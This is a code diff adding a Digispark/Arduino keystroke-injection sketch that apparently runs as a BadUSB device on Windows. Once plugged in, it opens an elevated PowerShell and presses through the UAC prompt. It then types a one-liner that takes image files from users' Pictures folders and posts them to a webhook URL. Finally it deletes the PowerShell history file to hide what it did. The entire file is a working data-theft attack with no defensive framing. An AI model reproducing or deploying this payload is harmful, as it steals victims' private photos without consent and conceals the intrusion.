@@ -1,0 +1,23 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.print(F("powershell -Command \"Start-Process powershell -Verb RunAs\""));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(8000);
+  DigiKeyboard.sendKeyStroke(0x1C, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print(F("$w='YOUR_WEBHOOK_URL';Add-Type -A System.Net.Http;$c=New-Object System.Net.Http.HttpClient;$p=[Environment]::GetFolderPath('MyPictures');if(Test-Path $p){gci $p -Include *.jpg,*.jpeg,*.png,*.bmp,*.gif -R -ea 0|Select -f 5|%{try{$b=[IO.File]::ReadAllBytes($_.FullName);$m=New-Object System.Net.Http.MultipartFormDataContent;$v=New-Object System.Net.Http.ByteArrayContent(,$b);$m.Add($v,'file',$_.Name);$null=$c.PostAsync($w,$m).Result;$m.Dispose();sleep -m 500}catch{}}}else{gci 'C:\\Users\\*\\Pictures' -ea 0|%{gci $_.FullName -Include *.jpg,*.jpeg,*.png,*.bmp,*.gif -R -ea 0|Select -f 5|%{try{$b=[IO.File]::ReadAllBytes($_.FullName);$m=New-Object System.Net.Http.MultipartFormDataContent;$v=New-Object System.Net.Http.ByteArrayContent(,$b);$m.Add($v,'file',$_.Name);$null=$c.PostAsync($w,$m).Result;$m.Dispose();sleep -m 500}catch{}}}};Remove-Item (Get-PSReadlineOption).HistorySavePath -ea 0;exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+}
+
+void loop() {
+  DigiKeyboard.update();
+}
